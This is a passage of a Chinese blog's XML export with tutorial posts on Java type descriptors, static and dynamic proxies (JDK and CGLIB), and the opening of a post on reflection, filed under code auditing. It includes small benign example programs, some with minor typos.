    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
<p>其中有这么一段记录,如下:</p>
<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">

<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
<p>于是我写了个简单的打印字符串数组Demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果为:</p>
<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">



<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
<p>我们在来看下Class的getName()方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终实现交给了getnamenative()方法。</p>
<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
<p>对于非数组类型:</p>
<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">



<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
<p>对于数组类型；</p>
<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">

<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
<p>我们来看看getName()方法的文档:</p>
<ul>
<li>对于原始数据类型，返回其 java 关键字</li>
<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
</ul>
<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
      </tags>
  </entry>
  <entry>
    <title>Java动态代理</title>
    <url>/2022/05/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>动态代理在Java中有着广泛的应用，比如Spring AOP、Hibernate数据查询、测试框架的后端mock、RPC远程调用、Java注解对象获取、日志、用户鉴权、全局性异常处理、性能监控，甚至事务处理等</p>
<h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p>创建一个代理对对象进行包装，用该代理对象取代原对象。后续操作中，任何对原对象的调用都要先通过代理对象。代理对象决定是否将方法调用转到原对象上。</p>
<p>代理模式是一种结构型设计模式，代理模式角色分为 3 种:</p>
<p><strong>Subject（抽象主题角色）</strong>：定义代理类和真实主题的公共对外方法，也是代理类代理真实主题的方法；</p>
<p><strong>RealSubject（真实主题角色</strong>）：真正实现业务逻辑的类；</p>
<p><strong>Proxy（代理主题角色）</strong>：用来代理和封装真实主题；</p>
<p>代理模式的结构比较简单，其核心是代理类，为了让客户端能够<strong>一致性地对待</strong>真实对象和代理对象，在代理模式中引入了抽象层.</p>
<p>代理模式<strong>按照职责</strong>（使用场景）来分类，至少可以分为以下几类：</p>
<p>1、远程代理  </p>
<p>2、虚拟代理 </p>
<p> 3、Copy-on-Write 代理   </p>
<p>4、保护（Protect or Access）代理  </p>
<p>5、Cache代理 </p>
<p> 6、防火墙（Firewall）代理  </p>
<p>7、同步化（Synchronization）代理 </p>
<p> 8、智能引用（Smart Reference）代理等等。</p>
<p>如果<strong>根据字节码的创建时机</strong>来分类，可以分为静态代理和动态代理：</p>
<ul>
<li>所谓<strong>静态</strong>也就是在<strong>程序运行前</strong>就已经存在代理类的<strong>字节码文件</strong>，代理类和真实主题角色的关系在运行前就确定了。</li>
<li>而动态代理的源码是在程序运行期间由<strong>JVM</strong>根据反射等机制<strong>动态的生成</strong>，所以在运行前并不存在代理类的字节码文件。</li>
</ul>
<h2 id="代理模式优势"><a href="#代理模式优势" class="headerlink" title="代理模式优势"></a>代理模式优势</h2><p>代理模式能够赋予我们控制访问某个类的能力，在某些情况下，代理可以允许我们屏蔽或控制某个对象的逻辑。在此基础上，引申出来的作用，也是目前开发中最常使用的作用：<code>在不修改原对象代码的基础上，对原对象的功能进行修改或者增强</code>。</p>
<h3 id="解耦"><a href="#解耦" class="headerlink" title="解耦"></a>解耦</h3><p>降低耦合度甚至解除耦合</p>
<p><strong>耦合</strong></p>
<p>当项目中的各个模块或者各个组件，当一个发生变动或者调用的时候，其他一些模块或组件也会产生变化或者调用，类似于齿轮的运转。</p>
<p><strong>耦合的问题</strong></p>
<p>当模块或组件耦合度过高时，会带来难以扩展、维护性差、纠错困难等问题，所以在设计时，要尽可能避免模块或组件之间的耦合度过高。</p>
<p>当我们想要给某个对象添加有些额外逻辑时，就可以使用代理模式，在不修改原代码的前提下，只针对额外功能进行编码。在整个过程中，原对象的逻辑和额外逻辑完全解耦，互不干扰。</p>
<h3 id="高扩展"><a href="#高扩展" class="headerlink" title="高扩展"></a>高扩展</h3><p>由于模块之间的解耦性，我们可以随时添加任意的功能或者修改之前的功能而不影响原模块的正常执行。</p>
<h2 id="JAVA代理模式"><a href="#JAVA代理模式" class="headerlink" title="JAVA代理模式"></a>JAVA代理模式</h2><p>Java中有三种方式来创建代理对象：</p>
<ul>
<li>静态代理</li>
<li>基于JDK(接口)的动态代理</li>
<li>基于CGLIB(Jar包)的动态代理</li>
</ul>
<h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><hr>
<p>手写代理类的代码，工程中有代理类的源码，代理类会编译执行。实现目标类的接口或者直接继承目标类，完成逻辑的修改和增强。</p>
<h4 id="接口实现方式"><a href="#接口实现方式" class="headerlink" title="接口实现方式"></a>接口实现方式</h4><img src="/2022/05/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208183027419.png" class title="image-20220208183027419">

<p>目标类:  程序猿(Developer) </p>
<p>代理类:   Java程序猿(JavaDeveloper)  FullStack程序猿(FullStackDeveloper)</p>
<p>程序猿(Develpoer.java)</p>
<p>定义一个程序员的接口，只干两件事情（程序员太忙，别的做不了）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Developer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">coded</span><span class="params">()</span></span>;<span class="comment">//会写代码</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span>;<span class="comment">//会调试程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>java程序猿会开发和调试java代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDeveloper</span> <span class="keyword">implements</span> <span class="title">Developer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JavaDeveloper</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">pubic <span class="keyword">void</span> <span class="title">code</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name+<span class="string">&quot;is  codding JavaDeveloper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">debug</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.name+<span class="string">&quot;is debugging JavaDeveloper&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后有个FullStack程序猿，在开发之前都会祈祷一下，这样他的代码就不会有bug，也不需要调试。</p>
<img src="/2022/05/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208180230522.png" class title="image-20220208180230522">

<p>全栈程序猿(FullStackDeveloper.java)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class FullStackDeveloper implements Developer &#123;</span><br><span class="line">   private Developer developer;</span><br><span class="line">   public FullStackDeveloper(Developer developer)</span><br><span class="line">   &#123;</span><br><span class="line">       this.developer = developer;</span><br><span class="line">   &#125;</span><br><span class="line">   public void code()</span><br><span class="line">   &#123;</span><br><span class="line">       System.out.println(&quot;FullStackDeveloper is praying for the code!&quot;);</span><br><span class="line">       this.developer.code();</span><br><span class="line">    &#125;</span><br><span class="line">    public void debug()</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;FullStackDeveloper&#x27;s  code is bug-free and does not require dedbugging&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>主函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        Developer str = new JavaDeveloper(&quot;YZT&quot;);</span><br><span class="line">        Developer developer = new FullStackDeveloper(str);</span><br><span class="line">        developer.code();</span><br><span class="line">        developer.debug();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<img src="/2022/05/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208182141430.png" class title="image-20220208182141430">

<p>如果YZT只是一个普通的Java程序猿，则开发结果是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YZT is  codding JavaDeveloper!</span><br><span class="line"></span><br><span class="line">YZT is  debugging  JavaDeveloper!</span><br></pre></td></tr></table></figure>



<p>但YZT是个全栈程序猿是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YZT is  praying for the code!</span><br><span class="line">YZT is  codding JavaDeveloper!</span><br><span class="line">YZT&#x27;code is bug-free and does not require dedbugging!</span><br></pre></td></tr></table></figure>



<h4 id="继承方式"><a href="#继承方式" class="headerlink" title="继承方式"></a>继承方式</h4><img src="/2022/05/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208183204722.png" class title="image-20220208183204722">

<p><strong>示例</strong></p>
<p>目标类:  程序猿(Developer) </p>
<p>代理类:   Java程序猿(JavaDeveloper)</p>
<p>程序猿类(Developer)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Developer &#123;</span><br><span class="line">    public String  code(String str)</span><br><span class="line">    &#123;</span><br><span class="line">     return str+&quot; is coding Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public String  debug(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        return str+&quot; is a debugging Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Java程序猿(javaDeveloper)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class JavaDeveloper extends Developer &#123;</span><br><span class="line">    public String code(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        String str1 = super.code(str);</span><br><span class="line">        String str2 = super.debug(str);</span><br><span class="line">        System.out.println(&quot;Wish you have a good Luck!&quot;);</span><br><span class="line">        return str1 +str2+ &quot; He will become a good Developer!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>主程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        Developer developer = new JavaDeveloper();</span><br><span class="line">        System.out.println(developer.code(&quot;YZT&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/05/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220208190213980.png" class title="image-20220208190213980">



<h4 id="存在问题"><a href="#存在问题" class="headerlink" title="存在问题"></a>存在问题</h4><p>静态代理虽然能实现代理模式，完成解耦，但是静态代理类的代码维护依然非常复杂，一旦接口或者父类发生了变动，则代理类的代码就得随之修改，代理类多的时候维护十分麻烦。</p>
<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>在内存中生成代理对象的技术。整个代理过程在内存中进行，不需要手动写代理类的代码，也不存在代理类的编译过程，而是直接在Java运行期，凭空在JVM中生成一个代理类对象，供我们使用。</p>
<h4 id="基于JDK的动态代理"><a href="#基于JDK的动态代理" class="headerlink" title="基于JDK的动态代理"></a>基于JDK的动态代理</h4><p>JDK自带的动态代理技术，需要使用静态方法来创建代理对象，要求目标类必须实现接口。</p>
<p><strong>Developer.java</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface Developer &#123;</span><br><span class="line">        void code();//会写代码</span><br><span class="line">        void debug();//会调试程序</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>GoodDeveloper.java</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class GoodDeveloper implements Developer &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    public  GoodDeveloper(String name)</span><br><span class="line">    &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void code() &#123;</span><br><span class="line">        System.out.println(this.name+&quot; is coding Gooddeveloper!!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public void debug() &#123;</span><br><span class="line">        System.out.println(this.name+&quot; is debugging Gooddeveloper!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>ProxyTest.java</strong></p>
<p>动态代理的例子采用了lambda表达式，主要代码是对InvocationHandler的实现。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public class ProxyTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Throwable &#123;</span><br><span class="line">        Developer developer = new GoodDeveloper(&quot;YZT&quot;);</span><br><span class="line">        //新建Developer类型，GoodDeveloper对象</span><br><span class="line">        Developer developerproxy = (Developer) Proxy.newProxyInstance(developer.getClass().getClassLoader(),developer.getClass().getInterfaces(),(proxy, method, args1) -&gt;&#123;</span><br><span class="line">            if(method.getName().equals(&quot;code&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(&quot;YZT is praying for the code!!!&quot;);</span><br><span class="line">                return method.invoke(developer,args1);</span><br><span class="line"></span><br><span class="line">            &#125; else if (method.getName().equals(&quot;debug&quot;)) &#123;</span><br><span class="line">                System.out.println(&quot;YZT&#x27;s code is bug-free and does not require debugging!!!&quot;);</span><br><span class="line">                return method.invoke(developer,args1);</span><br><span class="line">            &#125;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;);</span><br><span class="line">        //labmba匿名函数，新建Developer类型接口，定义方法体输入结果对code()和debug()函数进行动态设置</span><br><span class="line">        developerproxy.code();</span><br><span class="line">        developerproxy.debug();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2022/05/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210103459006.png" class title="image-20220210103459006">



<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>developerproxy的类型是Developer接口，而不是一个实现类。developer是基于Developer接口和GoodDeveloper的实现类加载代理出来的对象，并不属于任何一个实现类。</p>
<p>我们来看下<strong>ProxyTest.java</strong>中的newProxyInstance()接口:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.Proxy @NotNull </span><br><span class="line">public static Object newProxyInstance(ClassLoader loader,@NotNull Class&lt;?&gt;[] interfaces,             @NotNull reflect.InvocationHandler h)</span><br><span class="line">throws IllegalArgumentException</span><br></pre></td></tr></table></figure>

<p>接口中包括三个参数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader loader：固定写法，执行目标类对象的类加载器即可，用于加载目标类及其接口的代码</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;[] interfaces：固定写法，指定目标类对象的所有接口的Class对象的数组，通常使用目标类的Class对象调用getInterfaces()即可得到</span><br><span class="line"></span><br><span class="line">InvocationHandler h：这个参数是一个接口，主要关注它里面唯一一个方法，invoke方法。它会在代理对象调用方法时执行。也就是说，在代理类对象中调用任何方法，都会执行到invoke()方法。所以在该方法中完成对增强或扩展代码逻辑</span><br></pre></td></tr></table></figure>

<p>loader和interfaces决定这个类到底是个怎么样的类。而h是InvocationHandler，决定这个代理类到底是多了什么功能。所以动态代理的内容重点就是这个InvocationHandler。</p>
<h4 id="基于CGLIB-父类-的动态代理"><a href="#基于CGLIB-父类-的动态代理" class="headerlink" title="基于CGLIB(父类)的动态代理"></a>基于CGLIB(父类)的动态代理</h4><p>该方式是通过一个静态方法来创建代理对象，不要求目标类实现接口，但是对于目标类不能使用final进行修饰变量，基于目标类生成一个子类作为代理类，所以必须被继承。</p>
<p>首先在pom.xml文件中添加CGLIB依赖并下载 相关依赖文件资源。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;cglib&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;cglib&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.3.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<p><strong>Cglibtest.java</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ublic class Cglibtest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建一个目标类对象，也就是顾客对象</span><br><span class="line">        Developer developer = new Developer(&quot;YZT&quot;);</span><br><span class="line">        // 使用CGLIB创建代理类对象</span><br><span class="line">        Developer proxy = (Developer) Enhancer.create(developer.getClass(), new MethodInterceptor() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Object intercept(Object proxy, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable &#123;</span><br><span class="line">                if(&quot;code&quot;.equals(method.getName()))&#123;</span><br><span class="line">                    System.out.println(&quot;YZT is praying for the code!!!&quot;);</span><br><span class="line">                    return method.invoke(developer, args);</span><br><span class="line">                &#125;else if (&quot;debug&quot;.equals(method.getName()))&#123;</span><br><span class="line">                    System.out.println(&quot;YZT&#x27;s code is bug-free and does not require debugging!!!&quot;);</span><br><span class="line">                    return method.invoke(developer, args);</span><br><span class="line">                &#125;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        proxy.code();</span><br><span class="line">        proxy.debug();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Enhancer.create(Class type, Callback callback)</span><br></pre></td></tr></table></figure>

<p>参数列表</p>
<p><strong>Class type</strong>：指定目标类Class对象，也就是目标类类型</p>
<p><strong>Callback callback</strong>：Callback是一个接口，该接口只是一个名称定义接口，并不包含方法的声明，所以使用时通常使用它的一个子接口<code>MethodInterceptor</code>，<code>MethodInterceptor</code>接口中只有一个方法：<code>intercept</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">intercept</span><span class="params">(Object proxy, Method method, Object[] objects, MethodProxy methodProxy)</span></span></span><br></pre></td></tr></table></figure>

<p><strong>proxy</strong>：代理类对象</p>
<p><strong>method</strong>：对应的是出发intercept执行的方法的Method对象</p>
<p><strong>args</strong>：代理对象调用方法时，传递的实际参数</p>
<p>前三个参数与基于JDK的参数一致</p>
<p><strong>methodProxy</strong>：方法的代理对象，一般也不作处理，可以暂时忽略</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Proxy角色在执行代理业务的时候，无非是在调用真正业务之前或者之后做一些“额外”业务。 </p>
<img src="/2022/05/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210111635827.png" class title="image-20220210111635827">

<p>代理类处理的逻辑很简单，在调用某个方法前及方法后做一些额外的业务。换一种思路就是，在触发（invoke）真实角色的方法之前或者之后做一些额外的业务。为了构造出具有通用、简单的代理类，可以将所有的触发真实角色动作交给一个触发的管理器。这种管理器就是InvocationHandler。</p>
<img src="/2022/05/15/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/image-20220210111716233.png" class title="image-20220210111716233">



<p>在这种模式之中，代理Proxy和RealSubject需要实现相同的功能（函数方法）。</p>
<p>面向对象的编程之中，想要约定Proxy和RealSubject实现相同的功能（函数方法）有两种方式</p>
<p>a、定义一个功能接口，Proxy 和RealSubject都实现这个接口。</p>
<p>b、通过继承，Proxy继承自RealSubject，这样Proxy则拥有了RealSubject的功能，</p>
<p>JDK中提供的创建动态代理的机制采用a思路；而cglib采用b思路（spring两者都使用了）。 </p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-代码审计 -JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>java反射机制</title>
    <url>/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h1><p>本篇文章记录java的反射机制，虽然现在还不知道对渗透安全来说有什么好处，管他的，就是学@@</p>
<h2 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h2><blockquote>
<p>反射这个词啊，就是事物对外部动作刺激作出的相应反馈。今天学习的是java反射，那这又是什么东东呢？跟着小透来领略java带来的震撼和有趣吧！</p>
</blockquote>
<p>Java反射机制就是在程序运行状态中，动态调用任意一个类及其该类的所有属性和方法。(说实话，我TM看到这个解释的时候，一脸？？？)</p>
<p>下面我们将反射机制和直接类对象初始化作一个对比:</p>
<p>下面是自己写的helloworld类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.fanseTest;</span><br><span class="line"></span><br><span class="line">public class helloworld</span><br><span class="line">&#123;</span><br><span class="line">       public void hello(String str)</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(str.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>直接类对象实例化</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      helloworld test = <span class="keyword">new</span> helloworld();</span><br><span class="line">      test.hello(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211203210538333.png" class title="image-20211203210538333">



<ul>
<li>使用反射机制调用实例化</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fanse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        Class test = Class.forName(<span class="string">&quot;com.fanseTest.helloworld&quot;</span>);</span><br><span class="line">        Method test1 = test.getMethod(<span class="string">&quot;hello&quot;</span>, String.class);</span><br><span class="line">        Constructor constructor = test.getConstructor();</span><br><span class="line">        Object test2 = constructor.newInstance();</span><br><span class="line">        test1.invoke(test2, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<img src="/2021/12/07/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20211203212216759.png" class title="image-20211203212216759">



<p>我们可以从上面两个的对比来看，第一种是在运行前将类实例化成对象并调用方法赋值，第二种反射机制是在运行时动态调用方法和属性赋值。</p>
<h2 id="反射的利弊"><a href="#反射的利弊" class="headerlink" title="反射的利弊"></a>反射的利弊</h2><p>Java反射机制(Reflection)是java非常重要的动态特性，我们不仅可以通过反射获取到任何类的方法(Methods)，成员变量(Fields)，构造方法(Constructors)等信息，还能动态创建任何类实例，</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
<li><p>可扩展性</p>
<p>应用程序可以利用全限定名创建可扩展对象的实例，来使用来自外部的用户自定义类。</p>
</li>
<li><p>类浏览器和可视化开发环境</p>
